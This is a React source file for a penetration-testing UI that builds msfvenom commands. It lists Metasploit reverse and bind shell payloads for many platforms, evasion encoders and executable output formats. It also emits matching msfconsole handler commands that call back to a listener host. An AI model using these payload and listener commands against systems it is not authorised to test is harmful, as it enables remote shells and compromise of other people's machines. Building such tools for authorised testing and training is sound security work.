import { useState, useEffect } from 'react';
import { Input, Select, Button, Card, PayloadBlock } from '../../../components/ui';
import { ToolHeader } from '../../../components/ui/ToolHeader';
import { Bomb } from 'lucide-react';

// MSFVenom payload data
const PAYLOADS = [
    { label: 'Windows Meterpreter Reverse TCP (x64)', value: 'windows/x64/meterpreter/reverse_tcp' },
    { label: 'Windows Meterpreter Reverse TCP (x86)', value: 'windows/meterpreter/reverse_tcp' },
    { label: 'Windows Shell Reverse TCP (x64)', value: 'windows/x64/shell_reverse_tcp' },
    { label: 'Windows Shell Reverse TCP (x86)', value: 'windows/shell_reverse_tcp' },
    { label: 'Windows Meterpreter Bind TCP', value: 'windows/meterpreter/bind_tcp' },
    { label: 'Linux Meterpreter Reverse TCP (x64)', value: 'linux/x64/meterpreter/reverse_tcp' },
    { label: 'Linux Meterpreter Reverse TCP (x86)', value: 'linux/x86/meterpreter/reverse_tcp' },
    { label: 'Linux Shell Reverse TCP (x64)', value: 'linux/x64/shell_reverse_tcp' },
    { label: 'Linux Shell Reverse TCP (x86)', value: 'linux/x86/shell_reverse_tcp' },
    { label: 'PHP Reverse PHP', value: 'php/reverse_php' },
    { label: 'PHP Meterpreter Reverse TCP', value: 'php/meterpreter/reverse_tcp' },
    { label: 'Java JSP Shell Reverse TCP', value: 'java/jsp_shell_reverse_tcp' },
    { label: 'Python Shell Reverse TCP', value: 'python/shell_reverse_tcp' },
    { label: 'Python Meterpreter Reverse TCP', value: 'python/meterpreter/reverse_tcp' },
    { label: 'CMD Unix Reverse Bash', value: 'cmd/unix/reverse_bash' },
    { label: 'CMD Unix Reverse Netcat', value: 'cmd/unix/reverse_netcat' },
    { label: 'Android Meterpreter Reverse TCP', value: 'android/meterpreter/reverse_tcp' },
    { label: 'Apple iOS Meterpreter Reverse TCP', value: 'apple_ios/aarch64/meterpreter_reverse_tcp' },
    { label: 'macOS Meterpreter Reverse TCP', value: 'osx/x64/meterpreter/reverse_tcp' },
    { label: 'NodeJS Shell Reverse TCP', value: 'nodejs/shell_reverse_tcp' },
];

const ENCODERS = [
    { label: 'None', value: '' },
    { label: 'x86/shikata_ga_nai', value: 'x86/shikata_ga_nai' },
    { label: 'x64/xor', value: 'x64/xor' },
    { label: 'x64/xor_dynamic', value: 'x64/xor_dynamic' },
    { label: 'x86/xor_dynamic', value: 'x86/xor_dynamic' },
    { label: 'x86/call4_dword_xor', value: 'x86/call4_dword_xor' },
    { label: 'x86/countdown', value: 'x86/countdown' },
    { label: 'cmd/powershell_base64', value: 'cmd/powershell_base64' },
    { label: 'php/base64', value: 'php/base64' },
];

const FORMATS = [
    { label: 'EXE (Windows)', value: 'exe' },
    { label: 'ELF (Linux)', value: 'elf' },
    { label: 'DLL', value: 'dll' },
    { label: 'MSI', value: 'msi' },
    { label: 'VBA', value: 'vba' },
    { label: 'VBS', value: 'vbs' },
    { label: 'HTA', value: 'hta-psh' },
    { label: 'PowerShell', value: 'psh' },
    { label: 'PowerShell Command', value: 'psh-cmd' },
    { label: 'ASPX', value: 'aspx' },
    { label: 'JSP', value: 'jsp' },
    { label: 'WAR', value: 'war' },
    { label: 'PHP', value: 'php' },
    { label: 'Python', value: 'python' },
    { label: 'Perl', value: 'perl' },
    { label: 'Ruby', value: 'ruby' },
    { label: 'Raw', value: 'raw' },
    { label: 'C', value: 'c' },
    { label: 'CSharp', value: 'csharp' },
    { label: 'Hex', value: 'hex' },
    { label: 'Base64', value: 'base64' },
];

const PLATFORMS = [
    { label: 'Windows', value: 'windows' },
    { label: 'Linux', value: 'linux' },
    { label: 'OSX', value: 'osx' },
    { label: 'Android', value: 'android' },
    { label: 'BSD', value: 'bsd' },
    { label: 'PHP', value: 'php' },
    { label: 'Java', value: 'java' },
    { label: 'Python', value: 'python' },
    { label: 'NodeJS', value: 'nodejs' },
];

const ARCHITECTURES = [
    { label: 'x64', value: 'x64' },
    { label: 'x86', value: 'x86' },
    { label: 'aarch64', value: 'aarch64' },
    { label: 'armle', value: 'armle' },
];

interface MSFVenomConfig {
    payload: string;
    lhost: string;
    lport: string;
    encoder: string;
    iterations: string;
    platform: string;
    arch: string;
    nop: string;
    badchars: string;
    format: string;
    outfile: string;
}

export default function MSFVenomBuilder() {
    const [config, setConfig] = useState<MSFVenomConfig>(() => {
        const saved = localStorage.getItem('msfvenom_config');
        return saved ? JSON.parse(saved) : {
            payload: 'windows/x64/meterpreter/reverse_tcp',
            lhost: '10.10.14.5',
            lport: '4444',
            encoder: '',
            iterations: '4',
            platform: 'windows',
            arch: 'x64',
            nop: '',
            badchars: '',
            format: 'exe',
            outfile: 'shell.exe',
        };
    });

    const [copied, setCopied] = useState(false);

    useEffect(() => {
        localStorage.setItem('msfvenom_config', JSON.stringify(config));
    }, [config]);

    const updateConfig = (field: keyof MSFVenomConfig, value: string) => {
        setConfig(prev => ({ ...prev, [field]: value }));
    };

    const generateCommand = () => {
        const parts = ['msfvenom'];

        if (config.payload) parts.push(`-p ${config.payload}`);
        if (config.lhost) parts.push(`LHOST=${config.lhost}`);
        if (config.lport) parts.push(`LPORT=${config.lport}`);
        if (config.platform) parts.push(`--platform ${config.platform}`);
        if (config.arch) parts.push(`-a ${config.arch}`);
        if (config.encoder) parts.push(`-e ${config.encoder}`);
        if (config.iterations && config.encoder) parts.push(`-i ${config.iterations}`);
        if (config.nop) parts.push(`-n ${config.nop}`);
        if (config.badchars) parts.push(`-b "${config.badchars}"`);
        if (config.format) parts.push(`-f ${config.format}`);
        if (config.outfile) parts.push(`-o ${config.outfile}`);

        return parts.join(' ');
    };

    const generateHandler = () => {
        return `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${config.payload}; set LHOST ${config.lhost}; set LPORT ${config.lport}; run"`;
    };

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    return (
        <div className="space-y-6">
            {/* Header */}
            {/* Header */}
            <ToolHeader
                title="MSFVenom Builder"
                description="Generate msfvenom payloads with a visual interface. All options are saved automatically."
                badge="RT"
            />

            {/* Configuration Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {/* Payload */}
                <div className="lg:col-span-3">
                    <label className="block text-sm font-medium text-gray-300 mb-1">Payload</label>
                    <Select
                        options={PAYLOADS}
                        value={config.payload}
                        onChange={(v) => updateConfig('payload', v)}
                    />
                </div>

                {/* LHOST & LPORT */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">LHOST</label>
                    <Input
                        value={config.lhost}
                        onChange={(e) => updateConfig('lhost', e.target.value)}
                        placeholder="10.10.14.5"
                    />
                </div>
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">LPORT</label>
                    <Input
                        value={config.lport}
                        onChange={(e) => updateConfig('lport', e.target.value)}
                        placeholder="4444"
                    />
                </div>

                {/* Encoder & Iterations */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Encoder</label>
                    <Select
                        options={ENCODERS}
                        value={config.encoder}
                        onChange={(v) => updateConfig('encoder', v)}
                    />
                </div>
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Iterations</label>
                    <Input
                        value={config.iterations}
                        onChange={(e) => updateConfig('iterations', e.target.value)}
                        placeholder="4"
                        disabled={!config.encoder}
                    />
                </div>

                {/* Platform & Arch */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Platform</label>
                    <Select
                        options={PLATFORMS}
                        value={config.platform}
                        onChange={(v) => updateConfig('platform', v)}
                    />
                </div>
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Architecture</label>
                    <Select
                        options={ARCHITECTURES}
                        value={config.arch}
                        onChange={(v) => updateConfig('arch', v)}
                    />
                </div>

                {/* Bad Chars */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Bad Characters</label>
                    <Input
                        value={config.badchars}
                        onChange={(e) => updateConfig('badchars', e.target.value)}
                        placeholder="\x00\x0a\x0d"
                    />
                </div>

                {/* NOP */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">NOP Sled</label>
                    <Input
                        value={config.nop}
                        onChange={(e) => updateConfig('nop', e.target.value)}
                        placeholder="200"
                    />
                </div>

                {/* Format & Output */}
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Format</label>
                    <Select
                        options={FORMATS}
                        value={config.format}
                        onChange={(v) => updateConfig('format', v)}
                    />
                </div>
                <div>
                    <label className="block text-sm font-medium text-gray-300 mb-1">Output File</label>
                    <Input
                        value={config.outfile}
                        onChange={(e) => updateConfig('outfile', e.target.value)}
                        placeholder="shell.exe"
                    />
                </div>
            </div>

            {/* Generated Commands */}
            <div className="space-y-6">
                <div className="mb-6">
                    <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">MSFVenom Command</h3>
                    <PayloadBlock content={generateCommand()} />
                </div>

                <div className="mb-6">
                    <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">Metasploit Handler</h3>
                    <PayloadBlock content={generateHandler()} />
                </div>

                <div className="mb-6">
                    <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">Handler Module (Copy to Metasploit)</h3>
                    <PayloadBlock content={`use exploit/multi/handler\nset PAYLOAD ${config.payload}\nset LHOST ${config.lhost}\nset LPORT ${config.lport}\nrun`} />
                </div>
            </div>
        </div>
    );
}
